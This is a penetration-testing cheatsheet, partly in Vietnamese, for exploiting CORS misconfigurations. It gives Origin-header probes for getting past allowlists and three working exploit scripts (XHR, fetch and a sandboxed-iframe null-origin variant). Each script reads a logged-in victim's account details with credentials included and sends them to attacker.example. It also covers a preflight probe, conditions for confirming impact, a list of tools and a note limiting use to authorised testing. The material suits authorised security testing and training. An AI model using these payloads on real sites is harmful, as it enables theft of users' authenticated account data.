# CORS Payloads and Testing Cheatsheet

## Origin Probe Set

```http
Origin: https://attacker.com
Origin: null
Origin: http://trusted-subdomain.target.com
Origin: https://target.com.attacker.net
Origin: https://eviltarget.com
Origin: https://target_.attacker.com
Origin: https://target}.attacker.com
```

## Reflection Exploit (XHR)

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location =
      "https://attacker.example/log?d=" + encodeURIComponent(this.responseText);
  };
  req.open("GET", "https://victim.example.com/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

## Reflection Exploit (fetch)

```html
<script>
  fetch("https://victim.example.com/accountDetails", {
    method: "GET",
    credentials: "include",
  })
    .then(function (r) {
      return r.text();
    })
    .then(function (d) {
      location = "https://attacker.example/log?d=" + encodeURIComponent(d);
    });
</script>
```

## Null Origin Exploit (Sandboxed Iframe)

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="
<script>
fetch('https://victim.example.com/accountDetails', { credentials: 'include' })
  .then(function (r) { return r.text(); })
  .then(function (d) {
    location = 'https://attacker.example/log?d=' + encodeURIComponent(d);
  });
</script>"
></iframe>
```

## Manual Preflight Probe

```http
OPTIONS /api/data HTTP/1.1
Host: victim.example.com
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization
```

Cần xem server có trả:

- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`
- `Access-Control-Allow-Credentials`

## Minimal Validation Conditions

| Condition                      | Meaning                          |
| ------------------------------ | -------------------------------- |
| Browser đọc được response      | Exploitability xác thực          |
| Response chứa data nhạy cảm    | Có impact thực tế                |
| Credentials được gửi (nếu cần) | Có khả năng account-level impact |

## Useful Tools

- Burp Repeater/Proxy
- ZAP
- Corsy
- CORScanner
- theftfuzzer
- CorsOne

## Safety Note

Chỉ sử dụng payload trong phạm vi được cấp phép (lab, test environment, hoặc engagement hợp pháp).

## Related Files

- [Detection and Mapping](04-detection-and-mapping.md)
- [Exploitation Workflows](11-exploitation-workflows.md)
